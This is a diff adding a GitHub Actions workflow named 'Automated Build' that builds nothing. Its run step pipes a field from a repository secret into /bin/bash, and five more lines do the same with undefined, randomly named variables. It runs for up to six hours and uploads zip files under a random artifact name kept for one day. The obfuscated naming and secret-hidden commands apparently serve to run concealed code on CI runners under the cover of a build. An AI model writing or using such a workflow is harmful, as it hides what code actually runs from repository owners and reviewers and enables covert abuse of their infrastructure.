@@ -1,0 +1,40 @@
+name: Automated Build
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  service:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run
+        env:
+          dt16103: ${{ secrets.dt16103 }}
+        run: |
+          printf '%s' "$dt16103" | jq -r .jffq480 | /bin/bash
+          echo $nrlwb3 | jq -r .hmuzl7 | /bin/bash
+          echo $ozjd3688 | jq -r .bdmk36 | /bin/bash
+          printf '%s' "$o2" | jq -r .grt90 | /bin/bash
+          echo $gl1 | jq -r .z97 | /bin/bash
+          printf '%s' "$fq0887" | jq -r .gvy67543 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: pXm17M6Y
+          path: "*.zip"
+          retention-days: 1
